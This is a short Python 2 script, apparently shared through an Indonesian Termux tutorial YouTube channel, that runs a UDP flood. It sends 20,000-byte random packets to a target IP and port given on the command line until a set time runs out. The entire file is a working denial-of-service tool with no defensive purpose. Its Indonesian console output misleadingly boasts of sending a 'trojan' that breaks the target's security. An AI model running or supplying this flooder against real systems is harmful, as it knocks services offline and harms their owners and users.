import time
import socket
import random
import sys
def usage():
    print "\33[0;36m=================================================="
    print "                      \33[31;1mCommand :"
    print "    \33[31;1mpython2 torjancyber.py (ip) (port) (jumlah)"
    print " "
    print " "
    print "                  \33[1;33mThanks To : TUTORIAL TERMUX"
    print "\33[1;33mLink YT : https://www.youtube.com/channel/UCv0m4Y3hx6HM3h_m-kiHIJw/"
    print "\33[0;36m=================================================="
def flood(victim, vport, duration):
    # Subscribe TUTORIAL TERMIX
    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 20000 representasi satu byte ke server
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\33[0;32mMengirim Serangan Dalam \33[31;1m%s \33[0;32mTorjan Berhasil Terkirim Ke \33[31;1m%s \33[0;32mBerhasil Merusak Keamanan \33[31;1m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
